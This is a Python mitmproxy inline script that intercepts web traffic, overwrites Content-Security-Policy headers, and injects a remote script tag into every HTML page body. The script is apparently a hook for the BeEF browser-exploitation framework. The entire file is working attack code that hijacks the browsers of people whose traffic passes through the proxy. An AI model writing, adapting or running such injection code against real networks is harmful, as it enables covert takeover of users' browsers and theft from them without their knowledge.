from bs4 import BeautifulSoup
import sys, requests
from mitmproxy.models import decoded

class Beef_Test:

	def __init__(self, iframe_url):
		self.iframe_url = iframe_url

	def response(self, flow):
		if flow.request.host in self.iframe_url:
			return
		if "Content-Security-Policy" in flow.response.headers:
			flow.response.headers['Content-Security-Policy'] = "haha"
		html = BeautifulSoup(flow.response.content, "html.parser")
		if html.body:
			script = html.new_tag("script",src=self.iframe_url)
			html.body.insert(0, script)
			print(script)
			flow.response.content = str(html)

def start():
	arg = ''.join(sys.argv)
	bt = Beef_Test(arg.lstrip("mitm_test.py--"))
	return bt
